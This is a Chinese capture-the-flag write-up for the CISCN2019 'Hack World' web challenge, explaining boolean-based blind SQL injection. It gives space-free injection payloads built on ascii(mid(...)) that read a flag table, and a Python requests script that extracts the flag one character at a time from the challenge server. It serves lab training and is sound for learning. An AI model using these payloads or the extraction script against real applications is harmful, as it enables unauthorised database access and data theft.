# [CISCN2019 华北赛区 Day2 Web1]Hack World 布尔注入

<img src="https://i-blog.csdnimg.cn/blog_migrate/11f6120dadd4e43dc726f88473743707.png" alt="" style="max-height:126px; box-sizing:content-box;" />


正确的值



<img src="https://i-blog.csdnimg.cn/blog_migrate/c536178acac16f136eee17f595ad8864.png" alt="" style="max-height:103px; box-sizing:content-box;" />


错误的值 我们首先fuzz一下

发现空格被过滤了

我们首先测试

```cobol
(1)=(1)
(1)=(2)
```

确定了是布尔注入了

我们写一下查询语句

```lisp
(select(ascii(mid(flag,1,1))>1)from(flag))
 
(select(ascii(mid(flag,1,1))=102)from(flag))
```

确定了f 开头 我们开始写脚本

```cobol
import string
import time
 
import  requests
 
base_url="""http://af13e36c-216d-4683-8de3-7d39ed6ff520.node4.buuoj.cn:81/index.php"""
req=''
for i in range(100):
    for j in string.printable:
        payload="(select(ascii(mid(flag,{},1))={})from(flag))".format(i,ord(j))
        data={"id":payload}
        r=requests.post(url=base_url,data=data)
        if "Hello, glzjin wants a girlfriend." in r.text:
            req += j
            print(req)
        else:
            continue
        if r.status_code == 429 :
            time.sleep(0.5)
```

慢慢跑就行了